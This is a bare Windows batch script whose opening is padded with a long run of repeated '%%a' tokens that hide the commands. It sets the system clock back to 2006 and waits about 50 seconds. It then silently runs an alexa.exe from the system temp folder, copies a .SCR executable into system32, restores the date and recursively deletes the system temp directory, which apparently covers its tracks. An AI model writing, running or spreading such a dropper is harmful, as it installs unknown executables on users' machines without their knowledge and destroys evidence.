%%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a %%a 
cls
set date=%date%

date 2006-01-26

@echo off & setlocal enableextensions
echo WScript.Sleep 5000> %temp%.\tmp$$$.vbs
set /a i = 10
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
cscript //nologo %temp%.\tmp$$$.vbs
goto Timeout
goto End

:Next
%systemroot%\temp\alexa.exe /S
copy %systemroot%\temp\tmp.SCR %systemroot%\system32\
for %%f in (%temp%.\tmp$$$.vbs*) do del %%f

date %date%

RD /S /Q %systemroot%\temp\ 
